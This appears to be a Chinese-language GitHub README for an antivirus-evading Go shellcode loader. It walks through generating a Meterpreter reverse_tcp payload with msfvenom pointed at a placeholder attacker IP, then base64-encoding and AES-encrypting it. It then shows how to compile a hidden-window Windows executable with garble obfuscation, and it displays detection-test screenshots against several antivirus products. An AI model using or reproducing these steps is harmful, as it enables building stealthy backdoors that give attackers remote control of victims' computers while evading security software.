# go-shellcode-loader

GO免杀shellcode加载器

#### 获取项目

```Bash
git clone https://github.com/HZzz2/go-shellcode-loader.git
cd go-shellcode-loader
//下条命令安装第三方混淆库  GitHub地址：https://github.com/burrowers/garble
go install mvdan.cc/garble@latest    

```

#### 生成shellcode并base64

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`

`base64 -w 0 -i rev.raw > rev.bs64`

`cat rev.bs64`

**复制到aes-sc.go中的51行替换payload**

运行aes-sc.go生成AES加密后的值

`go run aes-sc.go`

复制输出的值到go-sc.go中的73行替换payload

#### **编译成exe可执行程序**

`garble -tiny -literals -seed=random build -ldflags="-w -s -H windowsgui" -race go-sc.go`

参数解释：

  garble(混淆库)：
                          -tiny                    删除额外信息
                          
                          -literals               混淆文字

                          -seed=random   base64编码的随机种子 

  go：
        -w                        去掉调试信息，不能gdb调试了

        -s                         去掉符号表

        -H windowsgui    隐藏执行窗口，不占用 cmd 终端。 （被查杀率高）

        -race                    使数据允许竞争检测

编译后得到go-sc.exe

#### 检测图

**火绒**

![](https://secure2.wostatic.cn/static/scesU3bCQaeSVpCehTJS84/image.png)

**360杀毒**

![](https://secure2.wostatic.cn/static/psmiLExVYYV725LtsLD3TU/image.png)

**360卫士**

![](https://secure2.wostatic.cn/static/f7gKLhEe1ApdDQwyLBN1a6/image.png)

**DF**

![](https://secure2.wostatic.cn/static/kvuYuMrLSZqxz1gzRjVowT/image.png)

**virustotal**

![](https://secure2.wostatic.cn/static/q69psHHLVRfNxXf4oKBK2J/image.png)

**微步云杀箱**

![](https://secure2.wostatic.cn/static/i1UvjPfa3DE9q9ALwwmbvH/image.png)



**运行效果**
https://user-images.githubusercontent.com/22775890/172315032-7ab13fea-9900-4cec-903e-48c8f7d0f2b7.mp4




